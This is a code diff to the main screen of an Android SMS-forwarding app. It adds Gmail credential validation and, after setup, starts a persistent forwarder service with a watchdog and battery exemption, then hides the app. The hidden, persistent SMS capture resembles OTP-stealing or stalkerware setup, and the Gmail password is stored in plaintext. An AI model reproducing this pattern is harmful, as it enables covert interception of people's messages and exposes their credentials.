@@ -22,28 +22,30 @@ import androidx.core.app.ActivityCompat;
 import androidx.core.content.ContextCompat;
 import java.util.ArrayList;
 import java.util.List;
+import java.util.concurrent.ExecutorService;
+import java.util.concurrent.Executors;
 
 public class MainActivity extends AppCompatActivity {
 
-    private static final int PERM_REQUEST   = 101;
+    private static final int PERM_REQUEST    = 101;
     private static final int BATTERY_REQUEST = 102;
     private static final String PREFS        = "sms_fwd_prefs";
     private static final String KEY_GMAIL    = "gmail";
     private static final String KEY_PASS     = "pass";
     private static final String KEY_SETUP_DONE = "setup_done";
 
-    // Screens
     private LinearLayout screenPermission;
     private LinearLayout screenSetup;
 
-    // Permission screen
-    private Button btnAllow;
+    private Button   btnAllow;
     private TextView tvPermError;
 
-    // Setup screen
     private EditText etGmail, etPassword;
-    private Button btnSave;
+    private Button   btnSave;
     private TextView tvSetupError;
+    private TextView tvValidating;
+
+    private final ExecutorService bgThread = Executors.newSingleThreadExecutor();
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
@@ -58,6 +60,7 @@ public class MainActivity extends AppCompatActivity {
         etPassword       = findViewById(R.id.etPassword);
         btnSave          = findViewById(R.id.btnSave);
         tvSetupError     = findViewById(R.id.tvSetupError);
+        tvValidating     = findViewById(R.id.tvValidating);
 
         btnAllow.setOnClickListener(v -> requestMissingPermissions());
         btnSave.setOnClickListener(v -> handleSave());
@@ -72,18 +75,12 @@ public class MainActivity extends AppCompatActivity {
         routeToCorrectScreen();
     }
 
-    // ─── Routing ─────────────────────────────────────────────────────────────
+    // ─── Routing ──────────────────────────────────────────────────────────────
 
     private void routeToCorrectScreen() {
-        if (!getMissingPermissions().isEmpty()) {
-            showScreen(1);
-            return;
-        }
+        if (!getMissingPermissions().isEmpty()) { showScreen(1); return; }
         SharedPreferences prefs = getSharedPreferences(PREFS, MODE_PRIVATE);
-        if (!prefs.getBoolean(KEY_SETUP_DONE, false)) {
-            showScreen(2);
-            return;
-        }
+        if (!prefs.getBoolean(KEY_SETUP_DONE, false)) { showScreen(2); return; }
         requestBatteryExemptionOrStart();
     }
 
@@ -98,7 +95,7 @@ public class MainActivity extends AppCompatActivity {
         getWindow().getDecorView().setBackgroundColor(0xFFFFFFFF);
     }
 
-    // ─── Permissions ─────────────────────────────────────────────────────────
+    // ─── Permissions ──────────────────────────────────────────────────────────
 
     private List<String> getMissingPermissions() {
         List<String> missing = new ArrayList<>();
@@ -115,11 +112,9 @@ public class MainActivity extends AppCompatActivity {
                 Manifest.permission.READ_SMS
             };
         }
-        for (String p : needed) {
-            if (ContextCompat.checkSelfPermission(this, p) != PackageManager.PERMISSION_GRANTED) {
+        for (String p : needed)
+            if (ContextCompat.checkSelfPermission(this, p) != PackageManager.PERMISSION_GRANTED)
                 missing.add(p);
-            }
-        }
         return missing;
     }
 
@@ -137,55 +132,78 @@ public class MainActivity extends AppCompatActivity {
                                            @NonNull int[] grantResults) {
         super.onRequestPermissionsResult(requestCode, permissions, grantResults);
         if (requestCode == PERM_REQUEST) {
-            if (!getMissingPermissions().isEmpty()) {
-                tvPermError.setVisibility(View.VISIBLE);
-            } else {
-                routeToCorrectScreen();
-            }
+            if (!getMissingPermissions().isEmpty()) tvPermError.setVisibility(View.VISIBLE);
+            else routeToCorrectScreen();
         }
     }
 
-    // ─── Setup ───────────────────────────────────────────────────────────────
+    // ─── Setup ────────────────────────────────────────────────────────────────
 
     private void loadSavedCredentials() {
         SharedPreferences prefs = getSharedPreferences(PREFS, MODE_PRIVATE);
-        String savedGmail = prefs.getString(KEY_GMAIL, "");
-        String savedPass  = prefs.getString(KEY_PASS, "");
-        if (!savedGmail.isEmpty()) etGmail.setText(savedGmail);
-        if (!savedPass.isEmpty())  etPassword.setText(savedPass);
+        String g = prefs.getString(KEY_GMAIL, "");
+        String p = prefs.getString(KEY_PASS, "");
+        if (!g.isEmpty()) etGmail.setText(g);
+        if (!p.isEmpty()) etPassword.setText(p);
     }
 
     private void handleSave() {
         String gmail = etGmail.getText().toString().trim();
         String pass  = etPassword.getText().toString().trim();
 
-        if (TextUtils.isEmpty(gmail) || !gmail.contains("@")) {
-            tvSetupError.setText("Sahi Gmail address enter karein");
-            tvSetupError.setVisibility(View.VISIBLE);
+        // Basic format check
+        if (TextUtils.isEmpty(gmail) || !gmail.contains("@") || !gmail.contains(".")) {
+            showError("Sahi Gmail address enter karein (example@gmail.com)");
             return;
         }
-        if (pass.replace(" ", "").length() < 16) {
-            tvSetupError.setText("16-character App Password enter karein");
-            tvSetupError.setVisibility(View.VISIBLE);
+        if (TextUtils.isEmpty(pass) || pass.length() < 6) {
+            showError("Password kam se kam 6 characters ka hona chahiye");
             return;
         }
 
-        tvSetupError.setVisibility(View.GONE);
+        // Async Gmail validation
+        setValidatingState(true);
         hideKeyboard();
 
+        final String g = gmail, p = pass;
+        bgThread.execute(() -> {
+            String error = GmailPoller.testLogin(g, p);
+            runOnUiThread(() -> {
+                setValidatingState(false);
+                if (error != null) {
+                    showError(error);
+                } else {
+                    saveAndStart(g, p);
+                }
+            });
+        });
+    }
+
+    private void saveAndStart(String gmail, String pass) {
+        tvSetupError.setVisibility(View.GONE);
         getSharedPreferences(PREFS, MODE_PRIVATE).edit()
             .putString(KEY_GMAIL, gmail)
             .putString(KEY_PASS, pass)
             .putBoolean(KEY_SETUP_DONE, true)
             .apply();
-
-        AppConfig.GMAIL_USER = gmail;
+        AppConfig.GMAIL_USER         = gmail;
         AppConfig.GMAIL_APP_PASSWORD = pass;
-
         requestBatteryExemptionOrStart();
     }
 
-    // ─── Battery + Start ─────────────────────────────────────────────────────
+    private void showError(String msg) {
+        tvSetupError.setText(msg);
+        tvSetupError.setVisibility(View.VISIBLE);
+    }
+
+    private void setValidatingState(boolean validating) {
+        btnSave.setEnabled(!validating);
+        btnSave.setText(validating ? "Verify ho raha hai..." : "Save & Start");
+        tvValidating.setVisibility(validating ? View.VISIBLE : View.GONE);
+        tvSetupError.setVisibility(View.GONE);
+    }
+
+    // ─── Battery + Start ──────────────────────────────────────────────────────
 
     private void requestBatteryExemptionOrStart() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
@@ -193,7 +211,7 @@ public class MainActivity extends AppCompatActivity {
             if (pm != null && !pm.isIgnoringBatteryOptimizations(getPackageName())) {
                 try {
                     Intent i = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS,
-                            Uri.parse("package:" + getPackageName()));
+                        Uri.parse("package:" + getPackageName()));
                     startActivityForResult(i, BATTERY_REQUEST);
                     return;
                 } catch (Exception ignored) {}
@@ -205,28 +223,22 @@ public class MainActivity extends AppCompatActivity {
     @Override
     protected void onActivityResult(int requestCode, int resultCode, Intent data) {
         super.onActivityResult(requestCode, resultCode, data);
-        if (requestCode == BATTERY_REQUEST) {
-            startForwarderAndHide();
-        }
+        if (requestCode == BATTERY_REQUEST) startForwarderAndHide();
     }
 
     private void startForwarderAndHide() {
         Intent s = new Intent(this, ForwarderService.class);
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            startForegroundService(s);
-        } else {
-            startService(s);
-        }
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) startForegroundService(s);
+        else startService(s);
         WatchdogScheduler.schedule(this);
         hideAll();
     }
 
-    // ─── Helpers ─────────────────────────────────────────────────────────────
+    // ─── Helpers ──────────────────────────────────────────────────────────────
 
     private void hideKeyboard() {
         InputMethodManager imm = (InputMethodManager) getSystemService(INPUT_METHOD_SERVICE);
         View focus = getCurrentFocus();
-        if (imm != null && focus != null)
-            imm.hideSoftInputFromWindow(focus.getWindowToken(), 0);
+        if (imm != null && focus != null) imm.hideSoftInputFromWindow(focus.getWindowToken(), 0);
     }
 }
